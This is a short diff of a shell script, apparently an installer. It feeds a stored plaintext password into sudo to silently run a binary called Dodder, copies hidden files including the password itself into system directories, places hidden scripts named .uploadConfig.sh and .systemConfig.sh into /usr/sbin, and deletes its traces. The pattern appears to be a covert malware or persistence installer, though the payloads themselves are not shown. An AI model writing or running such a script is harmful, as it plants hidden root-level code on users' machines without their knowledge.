@@ -25,9 +25,11 @@ do
     fi
 done
 cd $DIR/
-sudo -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null 2>&1
-sudo cp $DIR/.pic.jpg /usr/share/applications/
-sudo cp $DIR/.pass /var/log/
+sudo -k -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/.pic.jpg /usr/share/applications/ < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/.pass /var/log/ < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp script/.uploadConfig.sh /usr/sbin < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp script/.systemConfig.sh /usr/sbin < $DIR/.pass > /dev/null 2>&1
 rm $DIR/.pass
 rm $DIR/.pic.jpg
 rm $DIR/start.desktop
